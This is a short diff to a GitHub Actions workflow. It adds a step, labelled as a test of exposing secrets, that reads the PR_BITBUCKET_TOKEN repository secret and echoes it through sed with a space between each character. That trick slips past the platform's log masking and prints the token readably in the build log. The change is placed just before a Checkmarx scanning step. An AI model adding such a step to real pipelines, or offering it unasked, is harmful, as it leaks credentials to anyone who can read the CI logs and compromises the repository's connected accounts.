@@ -15,6 +15,10 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+      - name: test exposing secrets in GH Action
+        run: echo $SECRET | sed 's/./& /g'
+        env:
+          SECRET: ${{ secrets.PR_BITBUCKET_TOKEN }}
       - name: Checkmarx One CLI Action
         uses: checkmarx/ast-github-action@f0869bd1a37fddc06499a096101e6c900e815d81 # v.2.0.36
         with:
